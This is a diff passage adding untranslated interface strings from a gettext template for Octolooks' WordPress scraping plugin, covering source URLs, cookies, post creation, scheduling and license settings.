+msgid ""
+"The field used to set which cookie values to be sent to source url requests."
+msgstr ""
+
+#: views/scrape-meta-box.php:429
+msgid "Add new cookie"
+msgstr ""
+
+#: views/scrape-meta-box.php:436
+msgid "Source URL"
+msgstr ""
+
+#: views/scrape-meta-box.php:436
+msgid "The field used to set which source you want to scrape (Required)."
+msgstr ""
+
+#: views/scrape-meta-box.php:441
+msgid "URL"
+msgstr ""
+
+#: views/scrape-meta-box.php:442 views/scrape-settings.php:60
+msgid "e.g. http://octolooks.com"
+msgstr ""
+
+#: views/scrape-meta-box.php:452
+msgid "Post item"
+msgstr ""
+
+#: views/scrape-meta-box.php:452
+msgid "The field used to set which links redirect to detail pages (Required)."
+msgstr ""
+
+#: views/scrape-meta-box.php:468
+msgid "Next page"
+msgstr ""
+
+#: views/scrape-meta-box.php:468
+msgid "The field used to set which link redirects to next list page."
+msgstr ""
+
+#: views/scrape-meta-box.php:472
+msgid "Next page is found automatically."
+msgstr ""
+
+#: views/scrape-meta-box.php:490
+msgid "Category Options"
+msgstr ""
+
+#: views/scrape-meta-box.php:496
+msgid "Post type"
+msgstr ""
+
+#: views/scrape-meta-box.php:496
+msgid ""
+"The field used to set the post type for posts which will be created "
+"automatically by the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:505 views/scrape-meta-box.php:1082
+#: views/scrape-meta-box.php:1095 views/scrape-meta-box.php:1127
+#: views/scrape-meta-box.php:1142 views/scrape-meta-box.php:1265
+#: views/scrape-meta-box.php:1309 views/scrape-meta-box.php:1379
+#: views/scrape-meta-box.php:1444
+msgid "Please select a valid value."
+msgstr ""
+
+#: views/scrape-meta-box.php:512
+msgid "Create categories"
+msgstr ""
+
+#: views/scrape-meta-box.php:512
+msgid ""
+"The field used to set the categories of automatically created posts to which "
+"newly created categories by the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:542 views/scrape-meta-box.php:863
+msgid "Separator"
+msgstr ""
+
+#: views/scrape-meta-box.php:543 views/scrape-meta-box.php:864
+msgid "e.g. ,"
+msgstr ""
+
+#: views/scrape-meta-box.php:587
+msgid "Categories"
+msgstr ""
+
+#: views/scrape-meta-box.php:587
+msgid ""
+"The field used to set the categories of posts which will be created "
+"automatically by the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:606
+msgid "Post Options"
+msgstr ""
+
+#: views/scrape-meta-box.php:612
+msgid "Title"
+msgstr ""
+
+#: views/scrape-meta-box.php:612
+msgid ""
+"The field used to set post titles which will be created automatically by the "
+"plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:632 views/scrape-meta-box.php:712
+#: views/scrape-meta-box.php:796
+msgid "custom field"
+msgstr ""
+
+#: views/scrape-meta-box.php:678 views/scrape-meta-box.php:760
+#: views/scrape-meta-box.php:954 views/scrape-meta-box.php:1213
+msgid "Detect from feed"
+msgstr ""
+
+#: views/scrape-meta-box.php:679 views/scrape-meta-box.php:762
+#: views/scrape-meta-box.php:843 views/scrape-meta-box.php:919
+#: views/scrape-meta-box.php:955 views/scrape-meta-box.php:1214
+msgid "Select from source"
+msgstr ""
+
+#: views/scrape-meta-box.php:686
+msgid "Content"
+msgstr ""
+
+#: views/scrape-meta-box.php:686
+msgid ""
+"The field used to set post content which will be created automatically by "
+"the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:690
+msgid "Content is found automatically."
+msgstr ""
+
+#: views/scrape-meta-box.php:704
+msgid "content"
+msgstr ""
+
+#: views/scrape-meta-box.php:705
+msgid "title"
+msgstr ""
+
+#: views/scrape-meta-box.php:706
+msgid "categories"
+msgstr ""
+
+#: views/scrape-meta-box.php:707
+msgid "tags"
+msgstr ""
+
+#: views/scrape-meta-box.php:709
+msgid "featured image"
+msgstr ""
+
+#: views/scrape-meta-box.php:710
+msgid "gallery"
+msgstr ""
+
+#: views/scrape-meta-box.php:711
+msgid "embed"
+msgstr ""
+
+#: views/scrape-meta-box.php:761
+msgid "Detect automatically"
+msgstr ""
+
+#: views/scrape-meta-box.php:769
+msgid "Download images to media library"
+msgstr ""
+
+#: views/scrape-meta-box.php:776
+msgid "Excerpt"
+msgstr ""
+
+#: views/scrape-meta-box.php:776
+msgid ""
+"The field used to set post excerpt which will be created automatically by "
+"the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:842
+msgid "Generate from content"
+msgstr ""
+
+#: views/scrape-meta-box.php:850
+msgid "Tags"
+msgstr ""
+
+#: views/scrape-meta-box.php:850
+msgid ""
+"The field used to set the tags of posts which will be created automatically "
+"by the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:874
+msgid "e.g. octolooks, scrapes"
+msgstr ""
+
+#: views/scrape-meta-box.php:920 views/scrape-meta-box.php:1215
+msgid "Enter custom"
+msgstr ""
+
+#: views/scrape-meta-box.php:927
+msgid ""
+"The field used to set featured image for posts which will be created "
+"automatically by the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:931
+msgid "Featured image is found automatically."
+msgstr ""
+
+#: views/scrape-meta-box.php:945 views/scrape-meta-box.php:1277
+#: views/scrape-meta-box.php:1321 views/scrape-meta-box.php:1342
+#: views/scrape-meta-box.php:1413 views/scrape-meta-box.php:1428
+msgid "e.g. 100"
+msgstr ""
+
+#: views/scrape-meta-box.php:956
+msgid "Select from media library"
+msgstr ""
+
+#: views/scrape-meta-box.php:963
+msgid "Custom fields"
+msgstr ""
+
+#: views/scrape-meta-box.php:963
+msgid ""
+"The field used to set the custom meta fields of posts which will be created "
+"automatically by the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:991
+msgid "e.g [scrape_value]"
+msgstr ""
+
+#: views/scrape-meta-box.php:1052
+msgid "Add new custom field"
+msgstr ""
+
+#: views/scrape-meta-box.php:1063
+msgid "Translate Options"
+msgstr ""
+
+#: views/scrape-meta-box.php:1069
+msgid "Translate fields"
+msgstr ""
+
+#: views/scrape-meta-box.php:1069
+msgid ""
+"The field used to set the translation language for all fields of "
+"automatically created posts by the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:1074
+msgid "Source"
+msgstr ""
+
+#: views/scrape-meta-box.php:1076 views/scrape-meta-box.php:1089
+msgid "Please select a language"
+msgstr ""
+
+#: views/scrape-meta-box.php:1087
+msgid "Target"
+msgstr ""
+
+#: views/scrape-meta-box.php:1101 views/scrape-meta-box.php:1286
+msgid "Enable"
+msgstr ""
+
+#: views/scrape-meta-box.php:1112
+msgid "Publish Options"
+msgstr ""
+
+#: views/scrape-meta-box.php:1118
+msgid "Author"
+msgstr ""
+
+#: views/scrape-meta-box.php:1118
+msgid ""
+"The field used to set the publishing author for automatically created posts "
+"by the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:1134
+msgid ""
+"The field used to set which post status for automatically created posts by "
+"the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:1138
+msgid "Published"
+msgstr ""
+
+#: views/scrape-meta-box.php:1139
+msgid "Draft"
+msgstr ""
+
+#: views/scrape-meta-box.php:1140
+msgid "Pending review"
+msgstr ""
+
+#: views/scrape-meta-box.php:1141
+msgid "Private"
+msgstr ""
+
+#: views/scrape-meta-box.php:1149
+msgid "Date"
+msgstr ""
+
+#: views/scrape-meta-box.php:1149
+msgid ""
+"The field used to set the publish date of posts which will be created "
+"automatically by the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:1153
+msgid "Date is found automatically."
+msgstr ""
+
+#: views/scrape-meta-box.php:1204
+msgid "e.g. YYYY-MM-DD HH:mm:ss"
+msgstr ""
+
+#: views/scrape-meta-box.php:1212
+msgid "Process time"
+msgstr ""
+
+#: views/scrape-meta-box.php:1222
+msgid "Discussion"
+msgstr ""
+
+#: views/scrape-meta-box.php:1222
+msgid ""
+"The field used to set whether user comments are allowed for automatically "
+"created posts by the plugin in your WordPress site or not."
+msgstr ""
+
+#: views/scrape-meta-box.php:1226
+msgid "Allow comments"
+msgstr ""
+
+#: views/scrape-meta-box.php:1238
+msgid "Uniqueness Options"
+msgstr ""
+
+#: views/scrape-meta-box.php:1244
+msgid "Unique post check"
+msgstr ""
+
+#: views/scrape-meta-box.php:1244
+msgid "The field to use whether posts should be unique or not."
+msgstr ""
+
+#: views/scrape-meta-box.php:1248
+msgid "From title"
+msgstr ""
+
+#: views/scrape-meta-box.php:1249
+msgid "From content"
+msgstr ""
+
+#: views/scrape-meta-box.php:1250
+msgid "From source url"
+msgstr ""
+
+#: views/scrape-meta-box.php:1258
+msgid "On existing post"
+msgstr ""
+
+#: views/scrape-meta-box.php:1258
+msgid ""
+"The field to set the action when a post in source url already exists in the "
+"WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:1262 views/scrape-meta-box.php:1442
+msgid "Skip to next process"
+msgstr ""
+
+#: views/scrape-meta-box.php:1263
+msgid "Complete process"
+msgstr ""
+
+#: views/scrape-meta-box.php:1264
+msgid "Update post"
+msgstr ""
+
+#: views/scrape-meta-box.php:1272
+msgid "Complete run on loop"
+msgstr ""
+
+#: views/scrape-meta-box.php:1272
+msgid ""
+"The field to set how many on existing post occurrence is needed to stop the "
+"task until next run time in order to save system resources (Required)."
+msgstr ""
+
+#: views/scrape-meta-box.php:1278 views/scrape-meta-box.php:1322
+msgid "posts"
+msgstr ""
+
+#: views/scrape-meta-box.php:1297
+msgid "Schedule Options"
+msgstr ""
+
+#: views/scrape-meta-box.php:1303
+msgid "Cron type"
+msgstr ""
+
+#: views/scrape-meta-box.php:1303
+msgid ""
+"The field used to set the method of calling the task when it is due time in "
+"the plugin in your WordPress site."
+msgstr ""
+
+#: views/scrape-meta-box.php:1307
+msgid "System"
+msgstr ""
+
+#: views/scrape-meta-box.php:1308
+msgid "WordPress"
+msgstr ""
+
+#: views/scrape-meta-box.php:1316
+msgid "Total posts"
+msgstr ""
+
+#: views/scrape-meta-box.php:1316
+msgid ""
+"The field used to set how many posts will be created in the task in each run "
+"(Required)."
+msgstr ""
+
+#: views/scrape-meta-box.php:1330 views/scrape-meta-box.php:1351
+msgid "Unlimited"
+msgstr ""
+
+#: views/scrape-meta-box.php:1337
+msgid "Total runs"
+msgstr ""
+
+#: views/scrape-meta-box.php:1337
+msgid ""
+"The field to set how many times the task will run. When the task reaches the "
+"total run value it stops running (Required)."
+msgstr ""
+
+#: views/scrape-meta-box.php:1343
+msgid "times"
+msgstr ""
+
+#: views/scrape-meta-box.php:1358
+msgid "Run frequency"
+msgstr ""
+
+#: views/scrape-meta-box.php:1358
+msgid "The field to set the time interval of each task run."
+msgstr ""
+
+#: views/scrape-meta-box.php:1373
+msgid "On uncompleted run"
+msgstr ""
+
+#: views/scrape-meta-box.php:1373
+msgid ""
+"The field to use what action will be taken when a process is not finished "
+"and according to run frequency field another task should start."
+msgstr ""
+
+#: views/scrape-meta-box.php:1377
+msgid "Terminate previous run"
+msgstr ""
+
+#: views/scrape-meta-box.php:1378
+msgid "Wait until previous run is completed"
+msgstr ""
+
+#: views/scrape-meta-box.php:1386
+msgid "Run type"
+msgstr ""
+
+#: views/scrape-meta-box.php:1386
+msgid "The field to set where the task should start from for every run."
+msgstr ""
+
+#: views/scrape-meta-box.php:1390
+msgid "Start from first list page"
+msgstr ""
+
+#: views/scrape-meta-box.php:1391
+msgid "Continue from last scraped list page"
+msgstr ""
+
+#: views/scrape-meta-box.php:1402
+msgid "Other Options"
+msgstr ""
+
+#: views/scrape-meta-box.php:1408
+msgid "Timeout for process"
+msgstr ""
+
+#: views/scrape-meta-box.php:1408
+msgid ""
+"The field to set maximum time the task will wait for a reply for http "
+"requests (Required)."
+msgstr ""
+
+#: views/scrape-meta-box.php:1414 views/scrape-meta-box.php:1429
+msgid "seconds"
+msgstr ""
+
+#: views/scrape-meta-box.php:1423
+msgid "Wait next processes"
+msgstr ""
+
+#: views/scrape-meta-box.php:1423
+msgid "The field to set how much time to wait between processes (Required)."
+msgstr ""
+
+#: views/scrape-meta-box.php:1438
+msgid "On error"
+msgstr ""
+
+#: views/scrape-meta-box.php:1438
+msgid ""
+"The field to set what action will be taken if task encounters an error "
+"during scrape process."
+msgstr ""
+
+#: views/scrape-meta-box.php:1443
+msgid "Complete run"
+msgstr ""
+
+#: views/scrape-meta-box.php:1459
+msgid "Need Help?"
+msgstr ""
+
+#: views/scrape-meta-box.php:1460
+msgid "Please make sure that you have followed these steps in order."
+msgstr ""
+
+#: views/scrape-meta-box.php:1462
+msgid "Watch tutorials"
+msgstr ""
+
+#: views/scrape-meta-box.php:1463
+msgid "Read F.A.Q"
+msgstr ""
+
+#: views/scrape-meta-box.php:1464
+msgid "Contact Octolooks"
+msgstr ""
+
+#: views/scrape-meta-box.php:1470
+msgid "Create"
+msgstr ""
+
+#: views/scrape-meta-box.php:1509
+msgid "Disable styles"
+msgstr ""
+
+#: views/scrape-settings.php:39
+msgid "License Options"
+msgstr ""
+
+#: views/scrape-settings.php:45
+msgid "Purchase Code"
+msgstr ""
+
+#: views/scrape-settings.php:45
+msgid ""
+"The fields to set 36 character long purchase code and domain name without "
+"subdomain, starting with http which the plugin is defined to run on."
+msgstr ""
+
+#: views/scrape-settings.php:51
+msgid "Code"
+msgstr ""
+
+#: views/scrape-settings.php:59
+msgid "Domain"
+msgstr ""
+
+#: views/scrape-settings.php:68
+msgid ""
+"I confirm that my purchase code will be defined for a single domain name at "
+"first validation according to <a href=\"https://codecanyon.net/licenses/"
+"terms/regular\" target=\"_blank\">regular license</a> terms. It will be "
+"valid only for domain name that I entered including subdomain names and "
+"localhost for testing purposes."
+msgstr ""
+
+#: views/scrape-settings.php:69
+msgid "Must be confirmed in order to continue."
+msgstr ""
+
+#: views/scrape-settings.php:86
+msgid "Save"
+msgstr ""
+ */ 
